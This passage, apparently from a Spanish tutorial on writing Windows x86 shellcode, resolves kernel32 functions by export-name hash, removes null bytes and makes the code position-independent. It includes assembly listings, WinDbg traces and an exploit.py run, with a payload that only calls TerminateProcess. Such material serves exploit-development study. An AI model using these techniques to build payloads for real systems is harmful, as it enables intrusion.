</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">  <span class="z-meta z-brackets z-c++"><span class="z-punctuation z-section z-brackets z-begin z-c++">[</span>in<span class="z-punctuation z-section z-brackets z-end z-c++">]</span></span> <span class="z-support z-type z-windows z-c">HANDLE</span> <span class="z-variable z-parameter z-c++">hProcess</span><span class="z-punctuation z-separator z-c++">,</span>
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">  <span class="z-meta z-brackets z-c++"><span class="z-punctuation z-section z-brackets z-begin z-c++">[</span>in<span class="z-punctuation z-section z-brackets z-end z-c++">]</span></span> <span class="z-support z-type z-windows z-c">UINT</span>   uExitCode
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++"><span class="z-punctuation z-section z-group z-end z-c++">)</span></span></span><span class="z-punctuation z-terminator z-c++">;</span>
</span></code></pre>
<p>Invocamos una llama indirecta a EAX.</p>
<p>Para que esto pueda funcionar, colocamos el VMA de <code>TerminateProcess</code> en EAX antes del retorno de la función <code>find_function</code>. Una vez que se ha calculado nuestro hash, ejecutamos la función <code>find_function_compare</code>.</p>
<pre class="z-code"><code><span class="z-text z-plain">&quot;find_function_compare:&quot;
</span><span class="z-text z-plain">    &quot;cmp edx, [esp+0x24];&quot;    # Comparar el hash generado con el solicitado
</span><span class="z-text z-plain">    &quot;jnz find_function_loop;&quot; # Si no coincide vuelve a find_function_loop
</span><span class="z-text z-plain">    &quot;mov edx, [edi+0x24];&quot;    # AddressOfNameOrdinals RVA
</span><span class="z-text z-plain">    &quot;add edx, ebx;&quot;           # AddressOfNameOrdinals VMA
</span><span class="z-text z-plain">    &quot;mov cx, [edx+2*ecx];&quot;    # Extrapolar la funcion ordinal
</span><span class="z-text z-plain">    &quot;mov edx, [edi+0x1c];&quot;    # AddressOfFunctions RVA
</span><span class="z-text z-plain">    &quot;add edx, ebx;&quot;           # AddressOfFunctions VMA
</span><span class="z-text z-plain">    &quot;mov eax, [edx+4*ecx];&quot;   # obtener RVA
</span><span class="z-text z-plain">    &quot;add eax, ebx ;&quot;          # obtener VMA
</span><span class="z-text z-plain">    &quot;mov [esp+0x1c], eax;&quot;    # Sobrescribir la versión de pila de eax desde pushad 
</span></code></pre>
<p>Primero, esta funciónm compara EDX con el valor apuntado por ESP en el desplazamiento <code>0x24</code>, no olvidemos que en EDX está almacenado nuestro hash, que mandamos previamente a la pila (<code>add edx, eax;</code>).</p>
<p>Para que esta función tenga éxito, debemos aseegurarmos de que la dirección de memoria de ESP <code>0x24</code> apunte al hash que hemos generado.</p>
<blockquote>
<p><em>Hay que tener en cuenta que el desplazamiento con el registro ESP variará según el códio shell y la cantidad de instrucciones <code>push/pop</code> que se utilizen</em>.</p>
</blockquote>
<p>Si los hashes comparados no coinciden, retrocedemos a <code>find_function_loop</code> y obtenemos la siguiente entrada del array <code>AddressOfNames</code>. Una vez que tengamos la entrada correcta, obtenemos el rva de <code>AddressOfNameOrdinals</code>, en el desplazamiento <code>0x24</code> de la tabla de directorios de exportación que se almacena en EDI. La siguiente instrucción calcula la VMA de <code>AddressOfNameOrdinals</code> con ebx, que recordemos contiene la dirección base de kernel32.dll.</p>
<p>A esto le siguien estas operaciones:</p>
<pre class="z-code"><code><span class="z-text z-plain">    &quot;mov cx, [edx+2*ecx];&quot;    # Extrapolar la funcion ordinal
</span><span class="z-text z-plain">    &quot;mov edx, [edi+0x1c];&quot;    # AddressOfFunctions RVA
</span><span class="z-text z-plain">    &quot;add edx, ebx;&quot;           # AddressOfFunctions VMA
</span><span class="z-text z-plain">    &quot;mov eax, [edx+4*ecx];&quot;   # obtener RVA
</span><span class="z-text z-plain">    &quot;add eax, ebx ;&quot;          # obtener VMA
</span><span class="z-text z-plain">    &quot;mov [esp+0x1c], eax;&quot;    # Sobrescribir la versión de pila de eax desde pushad
</span></code></pre>
<p>ECX también se usara como índice de la matriz <code>AddressOfNames</code> como parte de nuestra función <code>find_function_loop</code>.</p>
<p>Debido a que <code>AddressOfNames</code> y las entradas de las matrices <code>AddressOfNameOrdinals</code> usan el mismo índice, una vez que encontramos la entrada para nuestro nombre de símbolo, podemos usar el mismo índice para recuperar la entrada de las matriz <code>AddressOfNameOrdinals</code>.</p>
<p>Multiplicamos ECX por <code>0x02</code> porque cada entrada en la matriz es un WORD.</p>
<p>Luego, trasladamos el valor del array <code>AddressOfNameOrdinals</code> al registro CX, que era nuestro contador/índice. Usaremos este nuevo valor como un nuevo índice en el array <code>AddressOfFunctions</code> .</p>
<p>Antes de usar el nuevo índice, recopilamos la RVA de <code>AddressOfFunctions</code>  en el desplazamiento <code>0x1c</code> y con <code>add edx, ebx;</code> obtenemos la VMA, ya que agregamos la direccion base de kernel32.dll que se encuentra en EBX.</p>
<p>Vamos a establecer  un punto de interrupción en <code>edx,dword ptr [edi+24h]</code> para comprobar que se alcanza la función TerminateProcess de forma correcta.</p>
<pre class="z-code"><code><span class="z-text z-plain">0:004&gt; bp 007e0070
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; g
</span><span class="z-text z-plain">Breakpoint 0 hit
</span><span class="z-text z-plain">eax=00000000 ebx=76c00000 ecx=00000593 edx=78b5b983 esi=76c886b3 edi=76c7b9f0
</span><span class="z-text z-plain">eip=007e0070 esp=020dfd4c ebp=020dff74 iopl=0         nv up ei pl zr na pe nc
</span><span class="z-text z-plain">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
</span><span class="z-text z-plain">007e0070 8b5724          mov     edx,dword ptr [edi+24h] ds:0023:76c7ba14=0007ec60
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; u @eip la
</span><span class="z-text z-plain">007e0070 8b5724          mov     edx,dword ptr [edi+24h]
</span><span class="z-text z-plain">007e0073 01da            add     edx,ebx
</span><span class="z-text z-plain">007e0075 668b0c4a        mov     cx,word ptr [edx+ecx*2]
</span><span class="z-text z-plain">007e0079 8b571c          mov     edx,dword ptr [edi+1Ch]
</span><span class="z-text z-plain">007e007c 01da            add     edx,ebx
</span><span class="z-text z-plain">007e007e 8b048a          mov     eax,dword ptr [edx+ecx*4]
</span><span class="z-text z-plain">007e0081 01d8            add     eax,ebx
</span><span class="z-text z-plain">007e0083 8944241c        mov     dword ptr [esp+1Ch],eax
</span><span class="z-text z-plain">007e0087 61              popad
</span><span class="z-text z-plain">007e0088 c3              ret
</span></code></pre>
<p>Una vez que hemos llegado al punto de interrupción, avanzaremos paso a paso por las instrucciones hasta que obtengamos la dirección de memoria virtual de <code>TerminateProcess</code>.</p>
<pre class="z-code"><code><span class="z-text z-plain">...
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; p
</span><span class="z-text z-plain">eax=76c2a210 ebx=76c00000 ecx=00000593 edx=76c7ba18 esi=76c886b3 edi=76c7b9f0
</span><span class="z-text z-plain">eip=007e0083 esp=020dfd4c ebp=020dff74 iopl=0         nv up ei pl nz na po nc
</span><span class="z-text z-plain">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
</span><span class="z-text z-plain">007e0083 8944241c        mov     dword ptr [esp+1Ch],eax ss:0023:020dfd68=020dffcc
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; u @eax
</span><span class="z-text z-plain">KERNEL32!TerminateProcessStub:
</span><span class="z-text z-plain">76c2a210 8bff            mov     edi,edi
</span><span class="z-text z-plain">76c2a212 55              push    ebp
</span><span class="z-text z-plain">76c2a213 8bec            mov     ebp,esp
</span><span class="z-text z-plain">76c2a215 5d              pop     ebp
</span><span class="z-text z-plain">76c2a216 ff2538bac876    jmp     dword ptr [KERNEL32!_imp__TerminateProcess (76c8ba38)]
</span><span class="z-text z-plain">76c2a21c cc              int     3
</span><span class="z-text z-plain">76c2a21d cc              int     3
</span><span class="z-text z-plain">76c2a21e cc              int     3
</span></code></pre>
<p>LLegados a este punto, hemos visto que el shellcode ha resuelto correctamente la dirección de memoria <code>TerminateProcess</code>, la última instrucción escribirá la dirección de la memoria en la pila en el desplazamiento <code>0x1c</code>.</p>
<p>Hacemos esto para garantizar que nuestra dirección se vuelva a incluir en EAX después de ejecutar <code>popad</code>.</p>
<p>Antes de continuar, echemos un vistazo de nuevo al prototipo de la función <code>TerminateProcess</code>:</p>
<pre data-lang="cpp" class="language-cpp z-code"><code class="language-cpp" data-lang="cpp"><span class="z-source z-c++"><span class="z-support z-type z-windows z-c">BOOL</span> <span class="z-meta z-function z-c++"><span class="z-meta z-toc-list z-full-identifier z-c++"><span class="z-entity z-name z-function z-c++">TerminateProcess</span></span></span><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++"><span class="z-punctuation z-section z-group z-begin z-c++">(</span></span></span><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">  <span class="z-meta z-brackets z-c++"><span class="z-punctuation z-section z-brackets z-begin z-c++">[</span>in<span class="z-punctuation z-section z-brackets z-end z-c++">]</span></span> <span class="z-support z-type z-windows z-c">HANDLE</span> <span class="z-variable z-parameter z-c++">hProcess</span><span class="z-punctuation z-separator z-c++">,</span>
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++">  <span class="z-meta z-brackets z-c++"><span class="z-punctuation z-section z-brackets z-begin z-c++">[</span>in<span class="z-punctuation z-section z-brackets z-end z-c++">]</span></span> <span class="z-support z-type z-windows z-c">UINT</span>   uExitCode
</span></span></span><span class="z-source z-c++"><span class="z-meta z-function z-parameters z-c++"><span class="z-meta z-group z-c++"><span class="z-punctuation z-section z-group z-end z-c++">)</span></span></span><span class="z-punctuation z-terminator z-c++">;</span>
</span></code></pre>
<p>Tras ejecutar la instrucción RET, volvemos a la función de inicio , donde ponemos a cero ECX y lo insertamos en la pila.</p>
<p>Este valor actuará como parámetro para <code>uExitCode</code> y representará una salida exitosa. Después se ejecuta una instrucción <code>push</code> que inserta el valor <code>0xFFFFFFFF</code> en la pila como el parámetro <code>hProcess</code> (El valor 1 representa un pseudo-handle para nuestro proceso).</p>
<pre class="z-code"><code><span class="z-text z-plain">...
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; p
</span><span class="z-text z-plain">eax=76c2a210 ebx=76c00000 ecx=00000000 edx=007e0000 esi=00815c80 edi=008122f0
</span><span class="z-text z-plain">eip=007e001d esp=020dfd68 ebp=020dff74 iopl=0         nv up ei pl zr na pe nc
</span><span class="z-text z-plain">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
</span><span class="z-text z-plain">007e001d ffd0            call    eax {KERNEL32!TerminateProcessStub (76c2a210)}
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; dds esp L3
</span><span class="z-text z-plain">020dfd68  ffffffff
</span><span class="z-text z-plain">020dfd6c  00000000
</span><span class="z-text z-plain">020dfd70  78b5b983
</span></code></pre>
<p>Para salir de una forma limpia podemos pasar por encima la llamada de <code>TerminateProcess</code>, para comprobar que el shellcode funciona correctamente podemos comentar <code>int3</code>, si todo funciona correctamente, el shellcode debería cerrarse correctamente.</p>
<pre class="z-code"><code><span class="z-text z-plain">C:\Users\dreamer\Python312-32&gt;python.exe exploit.py
</span><span class="z-text z-plain">Encoded 64 instructions...
</span><span class="z-text z-plain">Shellcode located at address 0x750000
</span><span class="z-text z-plain">...ENTER TO EXECUTE SHELLCODE...
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">C:\Users\dreamer\Python312-32&gt;echo %ERRORLEVEL%
</span><span class="z-text z-plain">0
</span></code></pre>
<p>Ahora podemos resolver cualqueir función exportada por <code>kernel32.dll</code>, lo que nos permite encadenar llaamdas a la API con mímina sobrecarga.</p>
<h2 id="como-evitar-bytes-nulos">Como evitar bytes nulos<a class="zola-anchor" href="#como-evitar-bytes-nulos" aria-label="Anchor link for: como-evitar-bytes-nulos" style="visibility: hidden;"></a>
</h2>
<p>Antes de llamar a otra API, debemos analizar el código, ya que nos genera bytes nulos.</p>
<pre class="z-code"><code><span class="z-text z-plain">0:004&gt; u @eip l7
</span><span class="z-text z-plain">01fc0000 cc              int     3
</span><span class="z-text z-plain">01fc0001 89e5            mov     ebp,esp
</span><span class="z-text z-plain">01fc0003 81ec00020000    sub     esp,200h
</span><span class="z-text z-plain">01fc0009 e811000000      call    01fc001f
</span><span class="z-text z-plain">01fc000e 6883b9b578      push    78B5B983h
</span><span class="z-text z-plain">01fc0013 e822000000      call    01fc003a
</span><span class="z-text z-plain">01fc0018 31c9            xor     ecx,ecx
</span></code></pre>
<p>Si observamos las instrucciones que generaron los bytes nulos, encontramos que la primera es <code>sub esp, 0x200</code>. Esta instrucción también puede usar un valor de desplazamiento negativo, o podemos usar una combinación de varias instrucciones que logren el mismo efecto, como se muestra a continuación:</p>
<pre class="z-code"><code><span class="z-text z-plain">0:004&gt; ? 0x0 - 0x210
</span><span class="z-text z-plain">Evaluate expression: -528 = fffffdf0
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; ? @esp + 0xfffffdf0
</span><span class="z-text z-plain">Evaluate expression: 4333304548 = 00000001`0248fae4
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; r @esp
</span><span class="z-text z-plain">esp=0248fcf4
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; ? 0248fcf4 - 0248fae4
</span><span class="z-text z-plain">Evaluate expression: 528 = 00000210
</span></code></pre>
<p>En vez de usar la operación <code>sub</code>, podemos agregar un desplazamiento mayor y obtener el mismo resultado.</p>
<pre class="z-code"><code><span class="z-text z-plain">&quot;start:&quot;
</span><span class="z-text z-plain">    &quot;int3;&quot;
</span><span class="z-text z-plain">    &quot;mov ebp, esp;&quot;
</span><span class="z-text z-plain">    &quot;add esp, 0xfffffdf0;&quot;
</span><span class="z-text z-plain">    ...
</span></code></pre>
<p>El resultado en WinDBG muestra que no contiene bytes nulos:</p>
<pre class="z-code"><code><span class="z-text z-plain">00d20000 cc              int     3
</span><span class="z-text z-plain">00d20001 89e5            mov     ebp,esp
</span><span class="z-text z-plain">00d20003 81c4f0fdffff    add     esp,0FFFFFDF0h
</span><span class="z-text z-plain">00d20009 e811000000      call    00d2001f
</span><span class="z-text z-plain">00d2000e 6883b9b578      push    78B5B983h
</span><span class="z-text z-plain">00d20013 e822000000      call    00d2003a
</span><span class="z-text z-plain">00d20018 31c9            xor     ecx,ecx
</span><span class="z-text z-plain">00d2001a 51              push    ecx
</span></code></pre>
<p>Sin embargo, las siguientes llamadas si contienen bytes nulos, ¿Cómo podemos solucionarlo?</p>
<h3 id="shellcode-independiente-de-la-poisicion">Shellcode independiente de la poisición<a class="zola-anchor" href="#shellcode-independiente-de-la-poisicion" aria-label="Anchor link for: shellcode-independiente-de-la-poisicion" style="visibility: hidden;"></a>
</h3>
<p>Hay varias maneras de evitar que las llamadas contengan bytes nulos, la más efectiva es obtener de forma dinámica la función que quereamos llamar y almacenarla en un registro.</p>
<p>Esta técnica, aprovecha el hecho de que una llamdada a una función ubicada en una dirección inferior utiliza un desplazamiento negativo, por lo tanto tiene una alta probabilidad de no contener bytes nulos. Además, al ejecutar la instrucción <code>call</code>, la dirección de retorno se almacena en la pila.</p>
<p>Esta dirección puede extraerse de la pila y almacenarse en un registro para calcular de forma dínamica la dirección absoluta de la función.</p>
<pre data-lang="python" class="language-python z-code"><code class="language-python" data-lang="python"><span class="z-source z-python"><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">start:<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">int3;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov ebp, esp;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">add esp, 0xfffffdf0;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">find_kernel32:<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">xor ecx, ecx;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov esi, fs:[ecx+30h];<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov esi, [esi+0Ch];<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov esi, [esi+1Ch];<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">next_module:<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov ebx, [esi+8h];<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov edi, [esi+20h];<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov esi, [esi];<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">cmp [edi+12*2], cx;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">jne next_module;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">ret;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span></code></pre>
<p>El snippet de código anterior muestra la función de inicio modificada . Tras liberar espacio en la pila, accedemos directamente a la función <code>find_kernel32</code> sin usar la instrucción <code>call</code>.</p>
<p>Dado que la instrucción <code>CALL</code> no era obligatoria, su eliminación nos permite evitar los bytes nulos generados por la llamada relativa.</p>
<p>Después de obtener la dirección base de kernel32.dll, llegaremos a las funciones recién agregadas que recopilarán la posición de nuestro shellcode en la memoria.</p>
<p>Comenzamos con <code>find_function_shorten</code>. Esta función contiene una sola instrucción de ensamblaje, que es un pequeño salto a <code>find_function_short</code>.</p>
<p>Debido a que estas funciones están próximas entre sí, los códigos de operación de la instrucción <code>JMP</code> no contendrán bytes nulos.</p>
<pre data-lang="python" class="language-python z-code"><code class="language-python" data-lang="python"><span class="z-source z-python"><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">find_function_shorten:<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> 
</span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">jmp find_function_short;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> salto corto
</span></span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">find_function_ret: <span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> 
</span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">pop esi;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                      <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Se saca de la pila la direccion de retorno
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov [ebp+0x04], esi;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>          <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Guarda la dirección find_function para despues
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">jmp resolve_symbols_kernel32;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Salta resolve_symbols_kernel32
</span></span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">find_function_short:<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> 
</span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">call find_function_ret;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> llamada relativa negativa
</span></span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">find_function:<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> 
</span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">pushad;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Guarda todos los registros
</span></span><span class="z-source z-python"><span class="z-constant z-language z-python">...</span>
</span></code></pre>
<p>El código del Listado anterior muestra que, tras alcanzar <code>find_function_short</code>, solo hay una instrucción. En esta ocasión, usaremos la instrucción <code>call</code> con <code>find_function_ret</code> como destino.</p>
<p>Dado que esta función se encuentra en una posición superior a la instrucción CALL, los códigos de operación generados contendrán un desplazamiento negativo que debería estar libre de bytes nulos, en lugar de uno positivo.</p>
<p>Tras ejecutar la instrucción CALL, se enviará la dirección de retorno a la pila. Esta apuntará a la primera instrucción de <code>find_function</code> .</p>
<p>Al inspeccionar <code>find_function_ret</code>, observamos que la primera instrucción es un POP, que toma el valor de retorno que introdujimos en la pila y lo coloca en ESI.</p>
<p>Después de la instrucción POP, ESI apuntará a la primera instrucción de find_function, lo que nos permite usar una llamada indirecta para invocarla. Luego, esta dirección se guarda en una desreferencia de EBP en el desplazamiento <code>0x04</code> para su uso posterior.</p>
<p>Finalmente, moveremos la instrucciones para enviar el hash, resolver la función y ejecutarla al final del shellcode.</p>
<pre data-lang="python" class="language-python z-code"><code class="language-python" data-lang="python"><span class="z-source z-python"><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">find_function_finished:<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">popad;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> restaturar los registros
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">ret;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Return
</span></span><span class="z-source z-python">
</span><span class="z-source z-python"><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">resolve_symbols_kernel32:<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">push 0x78b5b983;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> TerminateProcess hash
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">call dword ptr [ebp+0x04];<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> llamada a find_function
</span></span><span class="z-source z-python">	<span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov [ebp+0x14], eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Guardar la direccion TerminateProcess para despues
</span></span><span class="z-source z-python">	
